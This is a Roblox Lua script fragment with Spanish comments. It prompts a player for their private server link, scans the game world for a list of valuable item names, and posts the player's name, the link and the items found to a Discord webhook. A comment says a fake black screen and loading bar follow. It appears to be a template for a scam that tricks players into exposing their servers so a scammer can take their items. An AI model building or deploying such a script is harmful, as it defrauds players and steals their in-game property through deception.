-- Lista de nombres de objetos a monitorear
local objectNames = {
    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
}

-- Funci√≥n que busca los objetos en Workspace
local function findObjects()
    local found = {}
    for _, name in ipairs(objectNames) do
        local obj = Workspace:FindFirstChild(name, true) -- true = busca en descendants
        if obj then
            table.insert(found, name)
        end
    end
    return found
end

-- Funci√≥n para enviar al webhook
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "TU_WEBHOOK_AQUI"

local function sendToDiscord(content)
    local data = {["content"] = content}
    local jsonData = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
    end)
    if not success then
        warn("Error enviando al webhook:", err)
    end
end

-- üîπ Agregar al sendButton
sendButton.MouseButton1Click:Connect(function()
    local link = textBox.Text
    if link == "" then
        label.TextColor3 = Color3.fromRGB(255, 100, 100)
        label.Text = "‚ö†Ô∏è Please enter your private server link!"
        return
    end

    print("üîó Link entered:", link)
    inputFrame:Destroy() -- Quita el input frame

    -- Buscar objetos del jugador
    local objectsFound = findObjects()
    local message
    if #objectsFound == 0 then
        message = LocalPlayer.Name .. " is in server: " .. link .. "\nNo monitored objects were found in the base."
    else
        message = LocalPlayer.Name .. " is in server: " .. link .. "\nObjects found: " .. table.concat(objectsFound, ", ")
    end

    -- Enviar mensaje al webhook
    sendToDiscord(message)

    -- Aqu√≠ contin√∫a tu l√≥gica de pantalla negra y barra de carga...
end)

